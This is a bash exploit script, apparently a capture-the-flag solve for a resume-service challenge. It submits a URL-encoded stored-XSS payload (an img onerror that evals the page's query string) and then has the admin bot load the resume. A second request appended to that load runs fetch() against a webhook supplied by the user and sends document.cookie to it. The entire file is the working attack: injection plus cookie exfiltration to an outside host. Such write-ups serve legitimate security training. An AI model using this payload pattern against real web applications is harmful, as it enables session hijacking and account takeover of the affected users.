APP_URL='https://swift-resume-service-web.challs.infobahnc.tf/resumes'
BOT_URL='https://swift-resume-service-bot-web.challs.infobahnc.tf/report'

if [ "x$1" == "x" ]
then
	echo "Error: Specify webhook url as first argument. e.g. $0 http://example.com"
	exit 1
fi

UUID=`curl "$APP_URL" -X POST  -H 'Content-Type: application/x-www-form-urlencoded'  --data-raw 'template=%3Cimg+src%3D%22http%3A%2F%2F%24name%22%3E&name=foo.invalid%2F%22%CC%81%3Dd+onerror%3Deval%28window.foo%2BdecodeURIComponent%28location.search%29%29+%22%CC%81+&email=&currentPosition=&currentPositionDesc=' | grep -o '/resumes/[^"]*' | sed 's/\/resumes\///' `

echo 'Resume UUID='$UUID

curl "$BOT_URL" -X POST  -H 'Content-Type: application/x-www-form-urlencoded'  --data-raw 'resume='$UUID'%3F%3Ffetch%28%27'"$1"'%2F%3Fc%3D%27%2Bdocument.cookie%29'

echo
echo "Submitted to admin bot. Check logs of $1"
